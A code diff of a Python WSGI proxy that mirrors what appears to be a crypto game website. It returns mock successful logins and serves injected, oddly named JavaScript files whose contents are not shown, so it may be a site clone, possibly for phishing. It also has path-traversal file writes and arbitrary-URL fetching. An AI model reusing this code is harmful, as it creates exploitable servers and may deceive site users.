+                    # Use absolute path
+                    file_path = '/Users/home/Desktop/wget/Alex/App_files/Assets/autodrone-a197980a86d93925.js'
+                    logger.info(f"Looking for file at: {file_path}")
+                    
+                    if os.path.exists(file_path):
+                        logger.info(f"Found autodrone file at: {file_path}")
+                        with open(file_path, 'rb') as f:
+                            content = f.read()
+                        start_response('200 OK', [
+                            ('Content-Type', 'application/javascript'),
+                            ('Access-Control-Allow-Origin', '*'),
+                            ('Cache-Control', 'no-cache'),
+                            ('Content-Length', str(len(content)))
+                        ])
+                        return [content]
+                    else:
+                        logger.error(f"Autodrone file not found at: {file_path}")
+                except Exception as e:
+                    logger.error(f"Error serving autodrone file: {str(e)}")
+                    logger.error(traceback.format_exc())
+                
+                # If we get here, something went wrong
+                start_response('404 Not Found', [
+                    ('Content-Type', 'text/plain'),
+                    ('Access-Control-Allow-Origin', '*')
+                ])
+                return [b'File not found']
+            
+            # Handle OPTIONS requests (CORS preflight)
+            if method == 'OPTIONS':
+                start_response('200 OK', [
+                    ('Access-Control-Allow-Origin', '*'),
+                    ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
+                    ('Access-Control-Allow-Headers', 'Content-Type, Authorization'),
+                    ('Access-Control-Max-Age', '86400')  # 24 hours
+                ])
+                return [b'']
+            
+            # Handle authentication requests
+            if '/api/auth/' in path or '/api/user/' in path:
+                # Return a mock successful authentication response
+                mock_response = {
+                    "success": True,
+                    "user": {
+                        "id": "mock-user-123",
+                        "username": "mock_user",
+                        "email": "mock@example.com",
+                        "isAuthenticated": True,
+                        "token": "mock-token-xyz"
+                    }
+                }
+                
+                start_response('200 OK', [
+                    ('Content-Type', 'application/json'),
+                    ('Access-Control-Allow-Origin', '*'),
+                    ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
+                    ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+                ])
+                
+                return [json.dumps(mock_response).encode('utf-8')]
+            
+            # Handle S3 image requests
+            if 'web-illuvium-static.s3.us-east-2.amazonaws.com' in path:
+                # Extract the actual S3 URL
+                s3_url_match = re.search(r'/(https?:\/\/[^/]+\/.*)', path)
+                if s3_url_match:
+                    s3_url = s3_url_match.group(1)
+                    # Fix double semicolons if present
+                    s3_url = s3_url.replace(';//', '://')
+                    
+                    try:
+                        # Fetch the image from S3
+                        response = requests.get(s3_url, stream=True)
+                        if response.status_code == 200:
+                            # Determine content type
+                            content_type = response.headers.get('Content-Type', 'image/svg+xml')
+                            
+                            # Set response headers
+                            headers = [
+                                ('Content-Type', content_type),
+                                ('Cache-Control', 'public, max-age=31536000'),
+                                ('Access-Control-Allow-Origin', '*')
+                            ]
+                            
+                            start_response('200 OK', headers)
+                            return [response.content]
+                    except Exception as e:
+                        logger.error(f"Error fetching S3 image: {str(e)}")
+                
+                # If we get here, something went wrong
+                start_response('404 Not Found', [('Content-Type', 'text/plain')])
+                return [b'Image not found']
+                
+            # Handle root path
+            if path == '/':
+                with open('index.html', 'rb') as f:
+                    content = f.read()
+                content = self.modify_html_content(content)
+                start_response('200 OK', [('Content-Type', 'text/html')])
+                return [content]
+            
+            # Handle specific JS files
+            if path == '/settings.js':
+                try:
+                    with open('settings.js', 'rb') as f:
                         content = f.read()
                     start_response('200 OK', [('Content-Type', 'application/javascript')])
                     return [content]
-                except Exception as e:
-                    logger.error(f"Error serving load-complete.js: {str(e)}")
+                except FileNotFoundError:
                     start_response('404 Not Found', [('Content-Type', 'text/plain')])
                     return [b'File not found']
             
-            # Fix malformed Next.js image URLs with @ instead of ?
-            if path.startswith('/_next/image@') or path.startswith('_next/image@'):
-                fixed_path = path.replace('_next/image@', '/_next/image?')
-                if not fixed_path.startswith('/'):
-                    fixed_path = '/' + fixed_path
-                
-                logger.info(f"Fixed malformed Next.js image URL: {path} -> {fixed_path}")
-                
-                # Parse the URL components
-                parsed = urllib.parse.urlparse(fixed_path)
-                query = urllib.parse.parse_qs(parsed.query)
-                
-                if 'url' in query:
-                    image_url = urllib.parse.unquote(query['url'][0])
-                    if image_url.startswith('/'):
-                        image_url = image_url[1:]
-                    
-                    # Try to find the image locally
-                    local_image_path = os.path.join(self.directory, image_url)
-                    logger.info(f"Looking for image at: {local_image_path}")
-                    
-                    if os.path.exists(local_image_path):
-                        with open(local_image_path, 'rb') as f:
-                            content = f.read()
-                            content_type = mimetypes.guess_type(local_image_path)[0] or 'image/webp'
-                            start_response('200 OK', [('Content-type', content_type)])
-                            return [content]
-                    
-                    # If not found locally, try to fetch from original site
-                    url = urljoin(ORIGINAL_SITE, image_url)
-                    logger.info(f"Fetching image from original site: {url}")
-                    response = requests.get(url, timeout=10)
-                    if response.status_code == 200:
-                        content = response.content
-                        content_type = response.headers.get('Content-Type', 'image/webp')
-                        start_response('200 OK', [('Content-type', content_type)])
-                        return [content]
-                
-                # If we get here, we couldn't handle the image request
-                logger.warning(f"Could not process fixed Next.js image request: {fixed_path}")
-                start_response('200 OK', [('Content-type', 'image/webp')])
-                # Return an empty pixel instead of a 400
-                return [b'']
-            
-            # Special handling for Next.js image requests
-            if path.startswith('/_next/image') and query_string:
+            if path == '/qf1qoqnpzht.js':
                 try:
-                    query_params = urllib.parse.parse_qs(query_string)
-                    if 'url' in query_params:
-                        image_url = urllib.parse.unquote(query_params['url'][0])
-                        if image_url.startswith('/'):
-                            image_url = image_url[1:]
-                        
-                        # Try to find the image locally
-                        local_image_path = os.path.join(self.directory, image_url)
-                        logger.info(f"Looking for image at: {local_image_path}")
-                        
-                        if os.path.exists(local_image_path):
-                            with open(local_image_path, 'rb') as f:
-                                content = f.read()
-                                content_type = mimetypes.guess_type(local_image_path)[0] or 'image/webp'
-                                headers.append(('Content-type', content_type))
-                                start_response('200 OK', headers)
-                                return [content]
-                        
-                        # If not found locally, try to fetch from original site
-                        url = urljoin(ORIGINAL_SITE, image_url)
-                        logger.info(f"Fetching image from original site: {url}")
-                        response = requests.get(url, timeout=10)
-                        if response.status_code == 200:
-                            content = response.content
-                            content_type = response.headers.get('Content-Type', 'image/webp')
-                            headers.append(('Content-type', content_type))
-                            start_response('200 OK', headers)
-                            return [content]
-                    
-                    # If we get here, we couldn't handle the image request
-                    logger.warning(f"Could not process Next.js image request: {path}?{query_string}")
-                    start_response('200 OK', [('Content-Type', 'image/webp')])
-                    # Return an empty pixel instead of a 400
-                    return [b'']
-                except Exception as e:
-                    logger.error(f"Error processing Next.js image: {str(e)}")
-                    logger.error(traceback.format_exc())
-                    start_response('200 OK', [('Content-Type', 'image/webp')])
-                    # Return an empty pixel instead of a 500
-                    return [b'']
-            
-            # Handle the regular GET request
-            if method == 'GET':
-                # Try to serve local file first
-                local_path = os.path.join(self.directory, path[1:] if path.startswith('/') else path)
-                
-                # If path is a directory, try to serve index.html
-                if os.path.isdir(local_path):
-                    index_path = os.path.join(local_path, 'index.html')
-                    if os.path.exists(index_path):
-                        local_path = index_path
-                    else:
-                        # If no index.html, list directory contents
-                        start_response('403 Forbidden', [('Content-Type', 'text/plain')])
-                        return [b'Directory listing not allowed']
-                
-                if os.path.exists(local_path) and not os.path.isdir(local_path):
-                    with open(local_path, 'rb') as f:
+                    with open('qf1qoqnpzht.js', 'rb') as f:
                         content = f.read()
-                    content_type = mimetypes.guess_type(local_path)[0] or 'application/octet-stream'
-                    headers.append(('Content-type', content_type))
-                    
-                    # Process HTML content with all fixes
-                    if content_type and content_type.startswith('text/html'):
-                        content = self.process_html_content(content, host_url)
-                    # Modify JavaScript files
-                    elif content_type and content_type.startswith('application/javascript'):
-                        content = self.modify_chunk_content(content)
-                        
-                    start_response('200 OK', headers)
+                    start_response('200 OK', [('Content-Type', 'application/javascript')])
                     return [content]
-                
-                # Handle Next.js static files
-                if path.startswith('/_next/static'):
-                    # Try to fetch from original site
-                    url = urljoin(ORIGINAL_SITE, path)
-                    try:
-                        logger.info(f"Fetching Next.js static file: {url}")
-                        response = requests.get(url, timeout=10)
-                        if response.status_code == 200:
-                            content = response.content
-                            content_type = response.headers.get('Content-Type', 'application/javascript' if path.endswith('.js') else 'text/css')
-                            headers.append(('Content-type', content_type))
-                            
-                            # Modify chunk files if they are JavaScript
-                            if path.endswith('.js'):
-                                content = self.modify_chunk_content(content)
-                                
+                except FileNotFoundError:
+                    start_response('404 Not Found', [('Content-Type', 'text/plain')])
+                    return [b'File not found']
+            
+            # Handle _next directory requests
+            if path.startswith('/_next/'):
+                # For Next.js image optimization API
+                if path.startswith('/_next/image'):
+                    # Get query string from environ
+                    query_string = environ.get('QUERY_STRING', '')
+                    # Parse query parameters
+                    query_params = parse_qs(query_string)
+                    
+                    # Get the image URL and decode it
+                    if 'url' in query_params:
+                        image_url = query_params['url'][0]
+                        # URL decode the image path
+                        decoded_url = urllib.parse.unquote(image_url)
+                        
+                        # Check if we have the image cached locally
+                        cache_path = os.path.join(self.directory, 'cache', decoded_url.lstrip('/'))
+                        os.makedirs(os.path.dirname(cache_path), exist_ok=True)
+                        
+                        if os.path.exists(cache_path):
+                            # Serve from cache
+                            with open(cache_path, 'rb') as f:
+                                content = f.read()
+                            content_type = mimetypes.guess_type(cache_path)[0] or 'image/webp'
+                            headers = [
+                                ('Content-Type', content_type),
+                                ('Cache-Control', 'public, max-age=31536000'),
+                                ('Access-Control-Allow-Origin', '*')
+                            ]
                             start_response('200 OK', headers)
                             return [content]
-                    except Exception as e:
-                        logger.error(f"Error fetching Next.js static file: {str(e)}")
-                        # Rather than returning an error, return an empty file
-                        start_response('200 OK', [('Content-Type', 'application/javascript')])
-                        return [b'']
-                
-                # If local file not found, fetch from original site
-                url = urljoin(ORIGINAL_SITE, path)
-                try:
-                    response = requests.get(url, timeout=10)
-                    if response.status_code == 200:
-                        content = response.content
-                        content_type = response.headers.get('Content-Type', 'application/octet-stream')
-                        headers.append(('Content-type', content_type))
                         
-                        # Process HTML content with all fixes
-                        if content_type and content_type.startswith('text/html'):
-                            content = self.process_html_content(content, host_url)
-                        # Process JavaScript content
-                        elif content_type and content_type.startswith('application/javascript'):
-                            content = self.modify_chunk_content(content)
+                        # If not in cache, fetch from original site
+                        try:
+                            # Construct the full URL with query parameters
+                            proxy_url = f"{ORIGINAL_SITE}{decoded_url}"
                             
-                        start_response('200 OK', headers)
-                        return [content]
+                            # Fetch the image with proper headers
+                            headers = {
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                            }
+                            response = requests.get(proxy_url, headers=headers, stream=True)
+                            
+                            if response.status_code == 200:
+                                # Cache the image
+                                with open(cache_path, 'wb') as f:
+                                    for chunk in response.iter_content(chunk_size=8192):
+                                        if chunk:
+                                            f.write(chunk)
+                                
+                                # Get content type from response or guess from URL
+                                content_type = response.headers.get('Content-Type')
+                                if not content_type:
+                                    content_type = mimetypes.guess_type(decoded_url)[0] or 'image/webp'
+                                
+                                # Set response headers
+                                headers = [
+                                    ('Content-Type', content_type),
+                                    ('Cache-Control', 'public, max-age=31536000'),
+                                    ('Access-Control-Allow-Origin', '*')
+                                ]
+                                start_response('200 OK', headers)
+                                
+                                # Stream the response content
+                                def generate():
+                                    for chunk in response.iter_content(chunk_size=8192):
+                                        if chunk:
+                                            yield chunk
+                                return generate()
+                            else:
+                                start_response('404 Not Found', [('Content-Type', 'text/plain')])
+                                return [b'Image not found']
+                        except Exception as e:
+                            logger.error(f"Error fetching image: {str(e)}")
+                            start_response('500 Internal Server Error', [('Content-Type', 'text/plain')])
+                            return [b'Error fetching image']
                     else:
-                        start_response('200 OK', [('Content-Type', 'text/plain')])
-                        return [b'Not Found']
-                except Exception as e:
-                    logger.error(f"Error fetching from original site: {str(e)}")
-                    start_response('200 OK', [('Content-Type', 'text/plain')])
-                    return [b'']
-            else:
-                # Handle HEAD requests for CORS checks
-                if method == 'HEAD':
-                    start_response('200 OK', [
-                        ('Content-Type', 'text/plain'),
+                        start_response('400 Bad Request', [('Content-Type', 'text/plain')])
+                        return [b'Missing image URL parameter']
+                
+                # Handle other _next/ requests
+                next_path = path[6:]  # Remove /_next/ prefix
+                file_path = os.path.join(self.directory, '_next', next_path)
+                
+                if os.path.exists(file_path):
+                    with open(file_path, 'rb') as f:
+                        content = f.read()
+                else:
+                    # If file doesn't exist locally, proxy from original site
+                    proxy_url = f"{ORIGINAL_SITE}{path}"
+                    response = requests.get(proxy_url)
+                    content = response.content
+                
+                # Determine content type based on file extension
+                if file_path.endswith('.js'):
+                    content_type = 'application/javascript'
+                elif file_path.endswith('.css'):
+                    content_type = 'text/css'
+                elif file_path.endswith('.webp'):
+                    content_type = 'image/webp'
+                elif file_path.endswith('.svg'):
+                    content_type = 'image/svg+xml'
+                else:
+                    content_type = mimetypes.guess_type(file_path)[0] or 'application/octet-stream'
+                
+                # Add CORS headers for SVG files
+                headers = [('Content-Type', content_type)]
+                if path.endswith('.svg'):
+                    headers.extend([
                         ('Access-Control-Allow-Origin', '*'),
-                        ('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS'),
-                        ('Access-Control-Allow-Headers', '*'),
-                        ('Cross-Origin-Opener-Policy', 'same-origin')
+                        ('Cache-Control', 'public, max-age=31536000')
                     ])
-                    return [b'']
-                    
-                start_response('200 OK', [('Content-Type', 'text/plain')])
-                return [b'Method Not Allowed']
+                
+                start_response('200 OK', headers)
+                return [content]
             
+            # All other requests go through handle_request
+            return self.handle_request(environ, start_response)
+                
         except Exception as e:
             logger.error(f"Error handling request: {str(e)}")
             logger.error(traceback.format_exc())
-            start_response('200 OK', [('Content-Type', 'text/plain')])
-            return [b'']
+            start_response('500 Internal Server Error', [('Content-Type', 'text/plain')])
+            return [b'Internal Server Error']
 
-    def fix_css_keyframes(self, content):
-        """Fix CSS keyframe animation syntax errors."""
-        if isinstance(content, bytes):
-            content = content.decode('utf-8', errors='ignore')
+    def get_content_type(self, path):
+        """Determine the content type based on file extension."""
+        # Get the file extension
+        ext = os.path.splitext(path)[1].lower()
         
-        # Fix "@keyframes" with extra @ symbol
-        content = re.sub(r'@@keyframes', '@keyframes', content)
+        # Map of common extensions to content types
+        content_types = {
+            '.html': 'text/html',
+            '.htm': 'text/html',
+            '.js': 'application/javascript',
+            '.css': 'text/css',
+            '.json': 'application/json',
+            '.png': 'image/png',
+            '.jpg': 'image/jpeg',
+            '.jpeg': 'image/jpeg',
+            '.gif': 'image/gif',
+            '.svg': 'image/svg+xml',
+            '.webp': 'image/webp',
+            '.ico': 'image/x-icon',
+            '.woff': 'font/woff',
+            '.woff2': 'font/woff2',
+            '.ttf': 'font/ttf',
+            '.eot': 'application/vnd.ms-fontobject',
+            '.otf': 'font/otf',
+            '.txt': 'text/plain',
+            '.xml': 'application/xml',
+            '.pdf': 'application/pdf',
+            '.zip': 'application/zip',
+            '.gz': 'application/gzip',
+            '.tar': 'application/x-tar',
+            '.mp3': 'audio/mpeg',
+            '.mp4': 'video/mp4',
+            '.webm': 'video/webm',
+            '.ogg': 'audio/ogg',
+            '.wav': 'audio/wav'
+        }
         
-        # Fix keyframe percentages followed by colon without space and brace
-        content = re.sub(r'(\d+)%:', r'\1% {', content)
-        
-        # Fix where the colon is right next to the brace
-        content = re.sub(r'(\d+)%:({)', r'\1% \2', content)
-        
-        # Fix missing space between percentage and opening brace
-        content = re.sub(r'(\d+)%({)', r'\1% \2', content)
-        
-        # Fix missing space after "from" keyword
-        content = re.sub(r'from:', r'from {', content)
-        
-        # Fix missing space after "to" keyword
-        content = re.sub(r'to:', r'to {', content)
-        
-        # Fix extra closing braces
-        content = re.sub(r'}\s*}\s*}', '}}', content)
-        
-        # Fix missing closing brace at the end of keyframes
-        content = re.sub(r'(@keyframes[^}]+})(?!\s*})', r'\1}', content)
-        
-        return content.encode('utf-8')
-    
-    def process_html_content(self, content, host_url):
-        """Process HTML content with all fixes before serving."""
-        if isinstance(content, bytes):
-            content = content.decode('utf-8', errors='ignore')
-        
-        # Apply all fixes in sequence
-        content = self.remove_tracking_scripts(content).decode('utf-8', errors='ignore')
-        content = self.fix_css_keyframes(content).decode('utf-8', errors='ignore')
-        content = self.rewrite_urls(content).decode('utf-8', errors='ignore')
-        content = self.modify_html_content(content).decode('utf-8', errors='ignore')
-        content = self.modify_html_text(content).decode('utf-8', errors='ignore')
-        content = self.inject_load_complete_script(content).decode('utf-8', errors='ignore')
-        
-        return content.encode('utf-8')
+        # Return the content type or default to application/octet-stream
+        return content_types.get(ext, 'application/octet-stream')
 
-# Create WSGI application
-wsgi_app = WSGIHandler()
+# Create an instance of the WSGIHandler
+application = WSGIHandler()
 
 # For local testing with the built-in server
 if __name__ == "__main__":
     from wsgiref.simple_server import make_server
     port = int(os.environ.get("PORT", 8000))
-    httpd = make_server('', port, wsgi_app)
+    httpd = make_server('', port, application)
     print(f"Serving on port {port}...")
     httpd.serve_forever()
